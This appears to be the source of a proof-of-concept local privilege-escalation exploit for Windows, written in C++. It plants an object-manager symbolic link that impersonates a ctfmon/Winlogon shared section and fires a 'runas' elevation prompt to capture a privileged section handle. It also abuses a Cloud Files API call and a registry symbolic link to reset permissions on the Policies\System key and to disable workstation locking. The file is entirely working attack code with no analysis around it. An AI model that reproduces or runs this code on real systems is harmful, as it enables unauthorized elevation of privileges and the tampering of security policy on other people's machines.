

#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <aclapi.h>
#include <ntstatus.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <conio.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")


#define RtlOffsetToPointer(Base, Offset) ((PUCHAR)(((PUCHAR)(Base)) + ((ULONG_PTR)(Offset))))
HMODULE hm = GetModuleHandle(L"ntdll.dll");
NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
	OUT PHANDLE             pHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PUNICODE_STRING      DestinationName) = (NTSTATUS(WINAPI*)(
		OUT PHANDLE             pHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN PUNICODE_STRING      DestinationName))GetProcAddress(hm, "NtCreateSymbolicLinkObject");
NTSTATUS(WINAPI* _NtOpenSection)(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes
    ) = (NTSTATUS(WINAPI*)(
        _Out_ PHANDLE SectionHandle,
        _In_ ACCESS_MASK DesiredAccess,
        _In_ POBJECT_ATTRIBUTES ObjectAttributes))GetProcAddress(hm, "NtOpenSection");
NTSTATUS(WINAPI* _NtDeleteKey)(
    HANDLE hkey
    ) = (NTSTATUS(WINAPI*)(HANDLE hkey))GetProcAddress(hm, "NtDeleteKey");
DWORD(WINAPI* CfAbortOperation)(
    DWORD pid,
    void* unknown,
    DWORD flags
    ) = (DWORD(WINAPI*)(
        DWORD pid,
        void* unknown,
        DWORD flags
        ))GetProcAddress(LoadLibraryA("cldapi.dll"), "CfAbortOperation");



bool SetPolicyVal()
{

    bool ret = true;
    CfAbortOperation(GetCurrentProcessId(), NULL, 0x2);
    DWORD val = 1;
    DWORD dwRes = NULL;
    HKEY hk = NULL;
    DWORD res = NULL;
    PACL pACL = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;
    EXPLICIT_ACCESS ea;
    HANDLE htoken = NULL;
    DWORD dwSize = 0;
    wchar_t* stringSid = nullptr;
    wchar_t linktarget[MAX_PATH] = { 0 };
    PTOKEN_USER pTokenUser = NULL;
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (wchar_t*)L"Everyone";
    dwRes = SetEntriesInAcl(1, &ea, NULL, &pACL);
    if (ERROR_SUCCESS != dwRes) {
        printf("SetEntriesInAcl error: %d\n",dwRes);
        goto cleanup;
    }

    res = TreeSetNamedSecurityInfo((wchar_t*)L"CURRENT_USER\\Software\\Policies\\Microsoft\\CloudFiles", SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL, TREE_SEC_INFO_RESET_KEEP_EXPLICIT, NULL, ProgressInvokeNever, NULL);
    if (res)
    {
        printf("Failed to reset HKCU\\Software\\Policies\\Microsoft\\CloudFiles DACL, error : %d\n", res);
        goto cleanup;
    }
    res = RegDeleteTree(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps");
    if (res)
    {
        printf("Failed to delete HKCU\\Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps, error : %d\n", res);
        goto cleanup;
    }

    res = RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps", NULL, NULL, REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE, KEY_ALL_ACCESS, NULL, &hk, NULL);
    if (res)
    {
        printf("Failed to create HKCU\\Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps, error : %d\n", res);
        goto cleanup;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
        printf("OpenProcessToken, error : %d\n", GetLastError());
        _NtDeleteKey(hk);
        goto cleanup;
    }

    GetTokenInformation(htoken, TokenUser, nullptr, 0, &dwSize);

    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        printf("GetTokenInformation failed, error : %d\n",GetLastError());
        _NtDeleteKey(hk);
        goto cleanup;
    }
    pTokenUser = (PTOKEN_USER)malloc(dwSize);

    if (!GetTokenInformation(htoken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        printf("GetTokenInformation failed, error : %d\n", GetLastError());
        _NtDeleteKey(hk);
        goto cleanup;
    }
    CloseHandle(htoken);
    htoken = NULL;

    if (!ConvertSidToStringSid(pTokenUser->User.Sid, &stringSid)) {
        printf("ConvertSidToStringSid failed.\n");
        _NtDeleteKey(hk);
        goto cleanup;
    }
    wsprintf(linktarget, L"\\REGISTRY\\USER\\%ws\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",stringSid);
    
    res = RegSetValueEx(hk, L"SymbolicLinkValue", NULL, REG_LINK, (BYTE*)linktarget, wcslen(linktarget) * sizeof(wchar_t));
    if (res)
    {
        printf("Failed to create symbolic link, error : %d\n", res);
        _NtDeleteKey(hk);
        goto cleanup;
    }
    CfAbortOperation(GetCurrentProcessId(), NULL, 0x2);
    res = TreeSetNamedSecurityInfo((wchar_t*)L"CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL, TREE_SEC_INFO_RESET_KEEP_EXPLICIT, NULL, ProgressInvokeNever, NULL);
    if (res)
    {
        printf("Failed to reset HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System DACL, error : %d\n", res);
        goto cleanup;
    }

    _NtDeleteKey(hk);
    CloseHandle(hk);
    hk = NULL;
    res = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", NULL, KEY_SET_VALUE, &hk);
    if (res)
    {
        printf("Failed to open HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System ,error : %d\n", res);
        goto cleanup;
    }
    res = RegSetValueEx(hk, L"DisableLockWorkstation", NULL, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
    if (res)
    {
        printf("Failed to set HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System ,error : %d\n", res);
       goto cleanup;
    }

exit:

    if (pACL) 
        LocalFree(pACL);
    if (pSD) 
        LocalFree(pSD);
    if(hk)
        CloseHandle(hk);
    return ret;
cleanup:
    ret = false;
    goto exit;
}

int wmain(int argc, wchar_t** argv)
{
    
	wchar_t smpath[MAX_PATH] = { 0 };
	DWORD sesid = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sesid))
    {
        printf("Failed to find current process session id, error : %d\n", GetLastError());
        return 1;
    }
    if (!sesid)
    {
        printf("Seriously...?\n");
        return 1;
    }
	wsprintf(smpath, L"\\Sessions\\%d\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%d", sesid, sesid);
    wchar_t* ptarget = argc == 2 ? argv[1] : (wchar_t*)L"\\BaseNamedObjects\\CTFMON_DEAD";

    bool lockblock = false;
    SHELLEXECUTEINFO shi = { 0 };
	UNICODE_STRING linksrc = { 0 };
	UNICODE_STRING linktarget = { 0 };
	RtlInitUnicodeString(&linksrc, smpath);
	RtlInitUnicodeString(&linktarget, ptarget);
	OBJECT_ATTRIBUTES objattr = { 0 };
	InitializeObjectAttributes(&objattr, &linksrc, OBJ_CASE_INSENSITIVE, NULL, NULL);
	HANDLE hlnk = NULL;
    HANDLE hmapping = NULL;
	NTSTATUS stat = _NtCreateSymbolicLinkObject(&hlnk, GENERIC_ALL, &objattr, &linktarget);
	if (stat)
	{
		printf("Failed to create object manager link.\nEither ctfmon is running as SYSTEM or an instance of the PoC is already running.\n");
        goto cleanup;
	}

    shi.cbSize = sizeof(shi);
    shi.fMask = SEE_MASK_NOZONECHECKS | SEE_MASK_ASYNCOK;
    shi.lpVerb = L"runas";
    shi.lpFile = L"C:\\Windows\\System32\\conhost.exe";
    ShellExecuteEx(&shi);

    do {
        _NtOpenSection(&hmapping, MAXIMUM_ALLOWED, &objattr);
    } while (!hmapping);

    lockblock = SetPolicyVal();
    if (lockblock) {
        do {
            Sleep(20);
            HDESK dsk = OpenInputDesktop(NULL, NULL, GENERIC_ALL);
            if (!dsk || dsk == INVALID_HANDLE_VALUE)
                break;
            CloseDesktop(dsk);
        } while (1);
        LockWorkStation();
    }
    printf("Section handle : 0x%x\n", hmapping);
    printf("Press any button to close section and exit\n");
cleanup:
    if (hlnk)
        CloseHandle(hlnk);
    
    if (hmapping)
    {
        _getch();
        CloseHandle(hmapping);
    }
    if (lockblock)
        RegDeleteTree(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    return 0;
}
